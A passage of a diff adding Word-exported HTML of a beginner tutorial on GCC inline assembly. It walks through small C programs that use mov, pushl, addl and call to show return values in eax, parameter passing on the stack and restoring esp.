+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int i;<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>i = abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d\n&quot;,i);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;mov
+$100,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>100<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The gcc compiler allows us
+to call assembler code from C. You are also allowed to acess varibales defined in
+C in Assembler. The assembler syntax looks like a function call and requires
+the assembler instuction as a string. The most common assembler instruction is
+called mov. It requires two opearnds or parameters. The fisrt is the source and
+the second is the destination. As we want to move a number 100 in the eax
+register, our source is the number 100. All numbers must be prefaced by a $
+sign. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>We remind you once again,
+that a register is a named area in a microprocessor and all registers begin
+with a % sign. The assembler syntax was invented by AT&amp;T, however if you
+are from the windows world or the nasm world, the <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>syntax is the other way
+around, i.e. mov destination, source.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The above program simulates
+the return instruction by simply placing a value in a register. The most common
+instruction is the mov instruction, which normally makes up over 25% of any
+assembler program. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>To place the assembler
+instruction in a C program, we enclose the instructions within the keyword
+__asm with the normal brackets. In the above program the instruction set is
+placed in function abc. When the function executes, it simply moves/copies the
+value 100 in the eax register and then quits. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Coming back to function
+main, the value placed in the eax register is given to variable i. Thus, there
+is no way that the program knows or cares whether it is the return statement or
+a manual insertion of a value in the eax register that has done the job. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$10&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$20&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The instruction pushl pushes
+the values on the stack. Windows uses the push instruct</span><span
+style='font-family:"Trebuchet MS";color:#000066'>ion instead.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$10&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$20&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;, i
+, j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The next series of programs
+show how a function call in C is converted to assembler code. When there is a
+call to a function, first, the parameters get pushed on the stack in the
+reverse order. In assembler, it is the pushl instruction that is used to push
+anything on the stack. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>As a result, a call to abc
+function in C which is abc(20,10); will first push 10 on the stack using the
+push 10 instruction, which is then followed by the push 20 instruction . <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Thereafter the abc function
+is called in the normal C way but with no parameters.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Function abc is oblivious to
+the number of parameters it gets called with. All that it assumes is that it is
+called with the parameters present on the stack. It displays their values and
+then returns to main. However, an error results. This is because the stack is
+not restored back to where it should be. We moved it down 12 bytes while
+supplying parameters, so once the function call ends, it has to be restored
+back.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The next program repairs
+this glitch.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$10&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$20&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;addl
+$8,%esp&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>1108544020 1073828704<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The program amends the error
+by adding 8 to the stack pointer using the esp register. It is the esp register
+which decides where the stack starts in memory. If its value is 100, the stack
+is said to start at memory location 100. With every push instruction, the stack
+moves down 4 bytes or goes 4 less. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The addl instruction takes
+the incremental value first and then the register as the second parameter.
+Since the stack is restored back to its original position as before the
+function call, no errors are seen anymore.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;esp=%x\n&quot;,esp());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$10&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;esp=%x\n&quot;,esp());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl
+$20&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;esp=%x\n&quot;,esp());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>abc();<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;esp=%x\n&quot;,esp());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;addl
+$8,%esp&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;esp=%x\n&quot;,esp());<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int esp()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;movl
+%esp,%eax&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>esp=bfffdd78<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>esp=bfffdd74<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>esp=bfffdd70<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>esp=bfffdd70<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>esp=bfffdd78<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The above program shows a
+newly added function called esp. This function simply copies the value in the
+esp register to eax. This means that the return value of the function is now
+the stack position. As a result, before the first push, the stack position is
+seen at bfffdd78 and after the push 10 instruction, the stack shows a value of
+bfffdd74 which is 4 less. Thus the stack has moved down 4 bytes. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>The second push 20
+instruction moves the stack further down to bfffdd70. When function abc ends,
+the stack is at the same position of bfffdd70, which is what it was before the
+function call. These numbers re-confirm our explanation. <o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>a1.c<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>int abc(int i , int j)<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>printf(&quot;%d %d\n&quot;,
+i , j);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>main()<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>{<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>__asm(&quot;pushl $10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>pushl $20<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>call abc<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style="mso-spacerun:
+yes">       </span>addl $8,%esp<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><span style='mso-tab-count:
+1'>            </span>&quot;);<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>}<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>Output<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>20 10<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'>All assembly instruction are
+placed in one asm block,it is allowed but depreciated. A function call in C has
+its equivalent in assembler; it is the call instruction. This instruction only
+requires the actual physical address of the function to be called. In this
+program, instead of giving the address of the function, we have given it the
+function name. The system internally replaces the name of the function with its
+address.<o:p></o:p></span></p>
+
+<p class=WW-PlainText style='text-align:justify'><span style='font-family:"Trebuchet MS";
+mso-fareast-font-family:"MS Mincho";color:#000066'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>
+
